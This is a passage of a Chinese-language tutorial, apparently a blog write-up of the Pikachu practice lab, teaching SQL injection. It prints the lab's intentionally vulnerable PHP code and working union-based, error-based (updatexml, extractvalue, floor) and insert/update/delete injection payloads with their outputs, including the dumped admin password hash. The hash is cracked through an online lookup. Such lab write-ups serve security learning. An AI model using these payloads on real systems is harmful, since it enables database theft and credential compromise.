class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/config.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/function.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/mysql.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里没有做任何处理，直接拼到select里面去了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$name</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里的变量是字符型，需要考虑闭合
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select id,email from member where username=(&#39;</span><span class="si">$name</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//这里用括号来拼接变量字符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="nv">$data</span><span class="o">=</span><span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$id</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$email</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;your uid:</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2"> &lt;br /&gt;your email is: </span><span class="si">{</span><span class="nv">$email</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>实际上，开发人员常用千奇百怪层出不穷的拼接方法拼接SQL语句</p>
<p>构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xxx</span><span class="s1">&#39;) or 1=1 #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091.png"></p>
<p><strong>注入成功</strong></p>
<p>讲到这里你可能会感到疑惑：在看不到源码的情况下我们怎样判断注入点、构造闭合呢？</p>
<p>实际上，判断注入点和构造注入方式需要大量有技巧的尝试和丰富的经验</p>
<p>我们可以用不同的方式试探注入点，比如：尝试特殊字符、看报错信息、尝试构造不同的闭合、构造永真和永假逻辑式试探是否成功注入……</p>
<p>另外，补充一些SQL语句的注释规则：</p>
<ul>
<li>
<p>从<code>#</code>到行尾</p>
</li>
<li>
<p>从<code>--</code>序列到行尾</p>
<ul>
<li>要求序列后面至少跟一个空格符（空格、tab、换行符等）</li>
<li>该语法与标准SQL注释语法略有不同</li>
</ul>
</li>
<li>
<p>从<code>/*</code>序列到<code>*/</code>序列</p>
<ul>
<li>允许跨越多行</li>
</ul>
</li>
</ul>
<h3 id="数据获取">数据获取</h3>
<p>union联合查询可以让数据库进行多次查询</p>
<p>注意联合查询的字段数必须和主查询数一致，如下例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="err">字段</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="err">字段</span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">表名</span><span class="mi">1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="err">变量</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="err">字段</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="err">字段</span><span class="mi">2</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">表名</span><span class="mi">2</span><span class="w">
</span></span></span></code></pre></div><p>还有一些SQL内置函数，可以用来获取数据库信息。如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">查询数据库名称：</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">查询数据库用户：</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">查询数据库版本：</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>在看不见源码的情况下，要想进行联合查询就必须猜测主查询的字段数</p>
<p>我们常用<code>order by</code>语句和二分法进行字段数猜测</p>
<p><code>order by n</code>可以让数据库对查询到字段n的数据进行排序，当n大于查询字段数时就会报错</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="err">字段</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="err">字段</span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">表名</span><span class="mi">1</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="err">变量</span><span class="mi">1</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">数字</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>然后就可以利用order by进行二分法猜测查询字段数了</p>
<p><img alt="img" src="./img/202209%E4%BA%8C%E5%88%86.gif"></p>
<p>如图，说明字段数为2</p>
<p>知道字段数后就可以来构造payload了</p>
<p>以获取数据库名称和版本为例</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; union select database(),version() #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022090-1-2.png"></p>
<p><strong>数据获取成功</strong></p>
<p>也可以用无意义的查询填充字段数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; union select user(),1 #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022090-2-2.png"></p>
<p><strong>成功</strong></p>
<h3 id="information_schema">information_schema</h3>
<p>MySQL自带的information_schema表里也存放了大量重要信息</p>
<ul>
<li>
<p>SCHEMATA表</p>
<ul>
<li>提供当前MySQL实例中所有数据库的信息</li>
<li>是<code>show databases</code>的结果</li>
</ul>
</li>
<li>
<p>TABLES表</p>
<ul>
<li>
<p>提供关于数据库中表的信息</p>
</li>
<li>
<p>详细表述某个表属于哪个schema、表类型、表引擎、创建时间等信息</p>
</li>
<li>
<p>是<code>show tables from schemaname</code>的结果</p>
</li>
</ul>
</li>
<li>
<p>COLUMNS表：</p>
<ul>
<li>提供表中的列信息</li>
<li>详细表述了某张表的所有列及其信息</li>
<li>是<code>show columns from schemaname.tablename</code>的结果</li>
</ul>
</li>
</ul>
<p>鉴于内容较多这里不详细表述，建议翻阅<a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema.html">MySQL官方文档</a></p>
<p>下面来介绍一下一次SQL注入的简单完整流程</p>
<p>特殊字符测试&ndash;&gt;数据库报错，确认内容被拼接入语句中&ndash;&gt;order by语句测试&ndash;&gt;union联合查询&ndash;&gt;拿到当前数据库信息&ndash;&gt;利用information_schema进一步获取更多信息&ndash;&gt;针对所需获取数据库内容</p>
<p>前面的步骤都已叙述过，下面来详细介绍information_schema的利用</p>
<p>在已经查询出数据库名为pikachu后，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; union select table_schema,table_name from information_schema.tables where table_schema=&#39;</span><span class="n">pikachu</span><span class="s1">&#39; #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022090-4.png"></p>
<p>可以看到数据库pikachu的所有表的名称已经被遍历出来了</p>
<p>表users可能有我们想要的用户信息，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; union select table_name,column_name from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091-2.png"></p>
<p>现在表users的所有列信息都已被遍历出来了</p>
<p>username和password是我们所需的数据，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; union select username,password from users #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022092.png"></p>
<p>现在所有用户名和对应经过彩虹表加密的密码都被遍历出来了</p>
<p>加密的信息可以利用网上的<a href="https://www.cmd5.com/">反向查询</a>查出明文</p>
<p><img alt="img" src="./img/2022093.png"></p>
<p>通过相似的操作我们还可以获取数据库中的其他信息</p>
<p>如此，整个数据库都已被拿下</p>
<h3 id="sql函数报错的利用">SQL函数报错的利用</h3>
<p>在MySQL中我们可以通过使用一些指定的函数来制造报错并在其中嵌入表达式，进而利用报错获取设定的信息</p>
<p>当然，前提是后台没有对数据库报错信息进行屏蔽或处理</p>
<p>常用的制造报错的函数</p>
<ul>
<li><code>updatexml()</code>：MySQL对XML文档数据进行查询和修改的XPath函数</li>
<li><code>extractvalue()</code>：MySQL对XML文档数据进行查询的XPath函数</li>
<li><code>floor()</code>：MySQL小数取整函数</li>
</ul>
<h4 id="updatexml">updatexml()</h4>
<p>先来介绍<code>updatexml()</code>函数</p>
<p>语法：<code>UPDATE(XML_document,XPath_string,new_value);</code></p>
<ul>
<li><code>XML_document</code>是string格式，为XML文档对象的名称</li>
<li><code>XPath_string</code>是XPath格式的字符串，定位必须有效</li>
<li><code>new_value</code>是string格式，替换查找到的符合条件的数据</li>
<li>总而言之就是对<code>XML_document</code>文档里<code>XPath_string</code>里的内容用<code>new_value</code>进行替换</li>
</ul>
<p>依旧是GET表单</p>
<p><img alt="img" src="./img/2022090-0-1.gif"></p>
<p>输入单引号返回数据库报错，说明有可能是注入点</p>
<p>利用<code>updatexml()</code>构造payload获取报错信息</p>
<p>1和0是随便设定的错误数值，目的是让数据库返回报错信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,version(),0) #
</span></span></span></code></pre></div><p>页面返回报错信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;.26-0ubuntu0.18.04.1-log&#39;</span><span class="w">
</span></span></span></code></pre></div><p>返回的信息没有全部打印出来，我们可以利用<code>concat()</code>函数进行字符串拼接</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,version()),0) #
</span></span></span></code></pre></div><p><code>0x7e</code>是随便设定的字符<code>~</code>，无需深究</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~5.7.26-0ubuntu0.18.04.1-log&#39;</span><span class="w">
</span></span></span></code></pre></div><p>返回完整报错，注入成功</p>
<p>构造payload进一步获取更多信息</p>
<p>获取数据库名</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,database()),0) #
</span></span></span><span class="line"><span class="cl"><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">pikachu</span><span class="s1">&#39;
</span></span></span></code></pre></div><p>利用information_schema</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;</span><span class="n">pikachu</span><span class="s1">&#39;)),0) #
</span></span></span><span class="line"><span class="cl"><span class="s1">Subquery returns more than 1 row
</span></span></span></code></pre></div><p>报错一次只能显示一行，我们利用<code>limit</code>子句限制行数一次一个进行表名获取</p>
<ul>
<li>语法：select * from tableName limit i,n
<ul>
<li>tableName：表名</li>
<li>i：查询结果的索引值（默认从0开始）</li>
<li>n：查询结果返回的数量</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;</span><span class="n">pikachu</span><span class="s1">&#39; limit 0,1)),0) #
</span></span></span><span class="line"><span class="cl"><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">httpinfo</span><span class="s1">&#39;
</span></span></span></code></pre></div><p>获取到一个表名，接下来改一改索引值继续查询，不再赘述</p>
<p>查询到数据表users，同样的思路构造payload查询字段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; limit 0,1)),0) #
</span></span></span><span class="line"><span class="cl"><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">users</span><span class="s1">&#39;
</span></span></span></code></pre></div><p>获取到列名称后再来获取数据</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) #
</span></span></span><span class="line"><span class="cl"><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="k">admin</span><span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">x&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">#</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~e10adc3949ba59abbe56e057f20f883&#39;</span><span class="w">
</span></span></span></code></pre></div><p>重复同样的操作我们就可以拿下整个数据库了</p>
<h4 id="extractvalue">extractvalue()</h4>
<p><code>extractvalue()</code>函数的作用是从目标XML中返回包含所查询值的字符串</p>
<p>语法：<code>ExtractValue(XML_document,XPath_string);</code></p>
<ul>
<li><code>XML_document</code>是string格式，为XML文档对象的名称</li>
<li><code>XPath_string</code>是XPath格式的字符串，同样定位必须有效</li>
</ul>
<p>对于同样的表单，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">x</span><span class="s1">&#39; and extractvalue(0,concat(0x7e,version())) #
</span></span></span><span class="line"><span class="cl"><span class="s1">XPATH syntax error: &#39;</span><span class="o">~</span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">04</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="n">log</span><span class="s1">&#39;
</span></span></span></code></pre></div><p><strong>注入成功</strong></p>
<h4 id="floor">floor()</h4>
<p><code>floor()</code>报错注入准确地说应该是<code>floor</code>、<code>count</code>、<code>group by</code>冲突报错，<code>count(*)</code>、<code>rand()</code>、<code>group by</code>三者缺一不可</p>
<p>payload如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">a</span><span class="s1">&#39; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) #
</span></span></span></code></pre></div><ul>
<li><code>count()</code>函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。</li>
<li><code>floor()</code>函数+<code>rand()</code>函数：获取0或1的整数值</li>
<li><code>group by</code>函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；存在的话<code>count()</code>加1，在使用<code>group by</code>时<code>floor(rand(0)*2)</code>会被执行一次，若虛表不存在记录，插入虚表时会再执行一次</li>
</ul>
<p>这个payload较为复杂，待我深入学习SQL后再详细解析</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Duplicate</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="s1">&#39;5.7.26-0ubuntu0.18.04.1-log1&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w">
</span></span></span></code></pre></div><p><strong>注入成功</strong></p>
<h3 id="insertupdate注入">“insert/update”注入</h3>
<h4 id="insert">insert</h4>
<p>一个常见的注册表单</p>
<p><img alt="img" src="./img/2022090-5.png"></p>
<p>注册操作一般是用insert语句进行数据插入，如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">member</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">pw</span><span class="p">,</span><span class="n">sex</span><span class="p">,</span><span class="n">phonenum</span><span class="p">,</span><span class="n">email</span><span class="p">,</span><span class="n">address</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="mi">114514</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>构造闭合</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">member</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">pw</span><span class="p">,</span><span class="n">sex</span><span class="p">,</span><span class="n">phonenum</span><span class="p">,</span><span class="n">email</span><span class="p">,</span><span class="n">address</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;,114514,19,19,8,10)
</span></span></span></code></pre></div><p>故payload如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~pikachu&#39;</span><span class="w">
</span></span></span></code></pre></div><p><strong>返回报错，注入成功</strong></p>
<p>剩下的步骤大同小异，不再赘述</p>
<h4 id="update">update</h4>
<p>随便注册一个账号，登录进去，修改个人信息</p>
<p><img alt="img" src="./img/2022091-3.png"></p>
<p>这里修改数据库信息就可能存在update注入漏洞，注入原理和insert漏洞几乎一样</p>
<p>使用之前的payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</span><span class="w">
</span></span></span></code></pre></div><p>除了填payload之外其他表单也要随便填满才能被提交后台</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~pikachu&#39;</span><span class="w">
</span></span></span></code></pre></div><p><strong>注入成功</strong></p>
<h3 id="delete注入">“delete”注入</h3>
<p>一个留言板，和之前的存储型XSS是一样的甚至还留着上次XSS注入的痕迹</p>
<p><img alt="img" src="./img/2022093-1.png"></p>
<p>可以看到有个删除按钮，点下删除，BurpSuite抓个包看看</p>
<p><img alt="img" src="./img/2022091-0-1.png"></p>
<p>可以看到前端向后台提交了一个包含了留言对应ID的GET请求，数据库就会根据传入的ID进行删除操作</p>
<p>针对ID构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>但因为是GET请求，payload还要进行URL编码才能生效</p>
<p>使用BurpSuite自带的URL编码功能</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="o">+</span><span class="k">or</span><span class="o">+</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091-1-1.png"></p>
<p><strong>注入成功</strong></p>
<p>来看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;sqli_del.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span 